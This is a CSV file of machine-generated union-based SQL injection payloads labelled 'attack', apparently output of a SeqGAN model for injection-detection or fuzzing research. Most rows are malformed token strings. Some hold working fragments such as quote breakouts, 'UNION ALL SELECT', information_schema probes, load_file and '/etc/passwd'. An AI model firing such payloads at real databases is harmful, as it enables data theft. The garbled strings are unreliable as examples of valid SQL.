label,payload,family,payload_type,method,run_id,sample_index
attack,"-'+  (  select '9574'||  (  select '1'""  9584     (n all union all all select where -- -- 3560,9584",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,434
attack,"  select 6630d  =oder-- all @VE33560,8007--,4011---- ;--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,435
attack,"-f""   )    )   )    ) where bon8e-- bdm"", ""e  = m 6229on f  =  '1' 1858s  6229  =  7779 union select 6915 -- 4058r where select all -- can on moc5s,60833075,albmoas bya' 35605 where 95656346 where   2wn    )    )n   =us where u..32    eers where  =  5076 5543s where v-- where where where 4884 9584  ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,436
attack,"8950 all select bwhere 9584   =  =u  =h ua m d7336uan coban s$-- +=  8950 select where idban     bduders where where id1 all select -- 1580,2528 where where union wheres 9321  from qd  =  1 where all '||  (  select '  =  =  )    )   union union all 9565,43948 *,5076--4100--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,437
attack,"-i'iol-- 9584 -- 7779--idcan where d  =  =  ( use  =  )   union all 76824100 where -- 8498,6083-- null,5235,4884,I3967--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,438
attack,-7627%'a   a,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,439
attack,"-1550'||  (  select '%""ba'",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,440
attack,"-4058 union   =  =  1 union ao   dersiony mdfb,I,8950,2528,1580--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,441
attack," all select -- where aders dk= uag m  =  =  1 1s where 1580-- *  =  =  1 select select 6630a3733 where where 6083  id  =  4100   =  = us od  =  5729 =  union all  ,9321=  =  5543+  '1' mn  3733 6020#boc' 8417 where ,9571-- * where  =  1 9565 union all id ,b322aalt,3114bdadcync6196bd",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,442
attack,"-X' =  (   )   where where id  =  4719 idunion all ode=  '1' union vers where union  =  8095 union all all 2617 5076 -- afrom m @on uan union ""  (   union v   2528  )us where bo4abase5a   ane = uaabra'N null4058 v,7141,8950,6346,1942,5235,7039--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,443
attack,"1234 all us idteers rs where idrsod  =     =  ' 1s union   7682  2617  )   )    x union 8095 ms  =  =-- union j@@$dn ers   =  8417 as 7039  (  =e+u where where where where where union   =d  s union  where  5729  =  =  (   union  v$  Hb52aa where 3967d8R5729 3114,bonedev d  =  =",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,444
attack," union all 1 5543s2489' where 5235 dn  =  =  N '||  (  select 'pvr where 1 where from  =  4612 union where select iddbd8095ers -- d  =  =  6346d ude selecty5'||  (  select 'aleasc ,4612all,5235,4394,5729--,8147--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,445
attack,"-*'||  (  select '' xs  =  '||  (  select ' -- all 6083rs rs mt bs where i  =  =  +^ union union all all  m  idn   )   )   a where id  =  =  )   )n 5543  union 3114 idan)    a bmn 4719,5367,3114,9584-- where#,2163,2163--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,446
attack,-7001 union select -- --,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,447
attack,"-7963-67893638'' rs where *,2163  )    )   n users =ia' (  r where VE  )   union 8095 8417  =  union 8950 -- 3733,4612ylc,4394,5076--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,448
attack,"-%' all boan md  =du where 8202-- dbdban cs,9128-- -- where where ban ug   er where whereid  )   =  3114 where where select bans dmddbd7589boa-5an -- bd3'",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,449
attack,"-u""   union "" union 1 9184where ioa where 7682 from uodc= bbduaaonleapn select ba fromn mn union 8095 select 2617,7141,5076,3303,4884,----i 4100,5076,3303--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,450
attack,"-3226""  )  )    )   )n u' where 8tann  from mm  = m uownn m  =  (   )    )    n all union select 7779,2163,2391,8202--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,451
attack," union all or   1 union idvers   id  =  =  select where v$-- -- * rownm  =  -- select 7589,6346,8202--,,1580,47198498--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,452
attack,"-4452%'||  (  select 'h' union idmeunion where     =  1 union 1 from  =  (    union * all select all x  2163=   =  union all u  =  = union all select ,5235,5235,4884-- -- --",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,453
attack,"-6436' from where where 7336  =  1   9565 1 union $s monn  =  '/etc/passwd' 8 IOselect v,7336anc -- 820223916196e,,1580,6196,1942--as -- 3114onnn mon where5367r,2528 9321 ro   xs id  =  =  =  '1'  all from union all 5543sban where   =  1 +s  =  2528 <ra  where union boo)n all where id  =  =  5076 +",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,454
attack,"-17104876p' from all select 4884882025,O}ers (  =  =  9571 +$ 5076t where idbj9128n u  =  null where all xodemownmms   .  =  =  6630  = union all    =  '1' u' union 6255a select i",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,455
attack," +.  =   union select aae)    b0 where -- ddaer where irsioders-- where boslg where  2617 or od    =  2489 from where   =  (gers where 8147  =  6346 information_schema  =  )   )4394 call ,,5729,4394,5367,4884,5235,1942--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,456
attack,"-7848%""  )   )    )   Oy)   a' union select fromerid where o3114an ban  = union  9321   from all idm  =  =  1876'1' union select ban mdcedbsc2163 4100 where 9321  ( dd  =m  =  =  (    )   sn bam  =  =s mdm 1266  =  =  3432   =  1 union all select 21638095,9584 -- 67892163an oan where all ode  ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,457
attack,"-1606'||  (  select 'oac or^=  1 -- banncyc3303,4394,8147--9321-- -- 3114,--,2528,6083--59281942,40116255----",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,458
attack,"-3442' union all from all idd  = vers where xs iodeunion where 3114  =  =   or from union all select 8498,b,2256,6196--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,459
attack," -g c' us   =  =  1    from   * +s from all $ve\char@  =  =  8095 where   = 2489 union select 6915.-- 5928as 9584er  char 1 where 5076id0km', 'diddaa where union id81ear,9565,4719-- --",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,460
attack,"  4711  id ban md  =  ) 5076a \  2384""a  )   <union all select  -- 2163,ban select  8095,banct 4719-- 9321-,8202c' 7589 3114 where all v$,baR9dd9565eras' where 6229er  = 4612an mmo  =  =  v   iuaau  =  or all select 7589rs,8950c,4394,9777--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,461
attack,"-1641%""union all vver -- o0d048easa{ bmtd 1,8202,2990,5076,3733,3967--w",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,462
attack,"-8982'  union all all -- 8095,401165076--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,463
attack,"-1550'   )   union bdm  2163  =  2489  =  -- all  5543s1876* where       = where   =  '1'  =  1-- * union all select null,2391,1942--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,464
attack,1234 select where 5076  (   (nio22    an where where rs where 1266t  =  =  3303 union all all $vers aduser where urs where ' AND 1  =  0 UNION ALL SELECT 'd  rs moolc23Ec8.9128--4d0I,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,465
attack," select a  8202 usR   an where where4)    )   select IO2256 7336  =* all v where idibas where all  =-- 6229,8147,5235--6630,2990,J#--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,466
attack,"-2204'+  (  select ' mRhi2an,bnO4612 9571n or us3e,3075--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,467
attack, 8417  9808  8202    6 union all where -- 3114id802163 2256 1s--,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,468
attack,"u1876m  -8677'||  (  select 'Sfcza'' all o8ersian where "" AND 1  =  0 UNION ALL SELECT ""ddg t where union 4719rs all  =  =  union vers where   eid   where from01 ioodne where where6915 where c  2163  =  9571  where select where5076 io0d    an mdc4394 8007,5235,8007",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,469
attack,"m  -8325z%   union 8950n m where id  =s  =  9128 from d  =  =  7336 union 8950 booow   nnjall    - union all    9777 from mon   =  select 1 id9571= 8095  =  =  =  1 all select -- -- -- 1,1942-- 6083,8095,5235--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,470
attack,"-9145' all   =  union all select 2617-- 2256,@@VERSRRSION select ,3967--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,471
attack,"-3442' union   $  4100r all from v 8202  (  =  =s ' AND 1  =  0 UNION ALL SELECT 'odners where 4394-- 5543oa where all use  =  7039  5543   select in all 1266  =  =  (   union where where all information_schema^ union all @  4100ers idd  =  1 union 3114 all ban uak2256 where select union   =   select 3733-- where *,9571-- where 4719,1580,8147,2528,6255--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,472
attack,-6186m' from union select 8095--,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,473
attack,"-)'+  (  select '--pu$',5235,6255,6255d-- --",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,474
attack,"-'+  (  select 'f v  8095 xoe 7111  =  union all select 5543n id  =  8950  '1'   =    -s idu  )   ban where 6229  =o,nboda)n5 f  (2rwhere rs from where where   =  =  -- +la 7589,bal 1  ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,475
attack,"-2899"" union all select 8950,5235,5076,5235,8950--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,476
attack,"select union union select select 9571 -- where where all where where', '2163 dv  )    g  =  =   \'1' idudbmn,8007,4884,48848007",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,477
attack,"s-95714l    )    nn   )n all d  =  1 select =  union  6915  =  1 where -- 5928 -- 22568007,8095,3075,5076-- ,3114--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,478
attack,"-44653638' u' where   d6915  =  =  =   1  )   )   y  )    )   union all all  -- 2489,6255,load_fileV,8147""26083--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,479
attack,"-1606%""   )    basea 832d   d9O    anedveunion all usold1yc where 3114,9584",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,480
attack,"=u 1 --,7682,6630-- ,1580,2528,2990,6630,6630,4100--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,481
attack,"-8325'+  (  select 'j'||  (  select '' 8498rsidd  =  "" id   union * from us 2489dc baoa    lan m 4011,89t,6196,5367--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,482
attack,"-6436' union all \ 1 2617  =    1 from adus de  iodbner  =  ,   ,2617-- 8202,4884,8950--,9565--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,483
attack,"' uyn ton  =  =  from union bot t=  b5543  =  =s   1 6  =rs where 'a'=  . where information_schema.d  =  =  ( all vm 2990,5235,7141,3967,4011,8950,3303,6346,1942,<4884,6255--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,484
attack,-7485',union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,485
attack,-9574'ers all uowers 4612jboang md  6020 -- union m  =  1 union us' where 6083r=  1 v ler-  =  (     =  =  union all select select --,union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,486
attack,"-x8950' use  =  =union union all union 3967 8007,5235.e,3114,g,5235--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,487
attack,"-7637""   )   = all select 2489,4394,9128-- where3560,7039--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,488
attack,"-6067%""     )   )   baa2odoav uaa9dbaan where 2489 in where 6229  6915  (   as  in   =    =  s rs all dnown mom   =  5543  =  (   a information_schemauwdc boa where where rs i d  where where 7779t where 'a'6789 dd  8095   =   where from   =m  =  2617 where 8095ners where bos  =  6229 where *",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,489
attack,"-55205 \union all  =  1 union all all  all t 1,b--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,490
attack,"-' AND 1  =  0 UNION ALL SELECT '   -- all select,3075,,5543,f9321.6630--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,491
attack,"-6436' union "" AND 1  =  0 UNION ALL SELECT ""  =   8202 union select 3967,62552391,5235,6346--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,492
attack,"-7682'||  (  select '' union all select ,5729,,e--s",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,493
attack,"9808 v all uas aason 3733  = .<--  = rs  where union v9565 -- pN 4719,6630,8950,badban where mo0524leddrn c2a85w bnjer  =  )   union from (   n   union us$dners where 8950rsioen u  =  =  mm  =  2256 vm  =  =  =  1 +  1 -- 7141 select -- 9571 where ca ",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,494
attack,"-7627k' select 5543  =  =  (   4465us where2163   union all all from id  =  =  = u from 2990ban v  =  =  '1' all select 1266l where-- -- 5076-- 1,3733,8202,1942--,7141,--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,495
attack,"-3009v2643  '+  (  select '   8 ,ibc-- 3075--81472391",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,496
attack,"-7627%'' vers ' AND 1  =  0 UNION ALL SELECT 'all  =  ( id  =  all all 6346 union 8417 4612,3114ee,bayRt5",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,497
attack,"-'||  (  select 'n   )    an union union   us 2ders os n  =  2489   = 1 vers where  )   aon '||  (  select 'mocNer  1 -- -- null2256,2256,1580,9571,bda wherec5--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,498
attack,"-6436' i k union select 4719,70392256vqbaw d   abn e-- where rs  where 4719,8950idn  (    )n   union all select 3303-- 5076,6346--",union,union,seqgan_improved,seqgan_improved__phase3__union__F__200__V8__sql_aware__len160__gpre80__reward_on__seed88,499
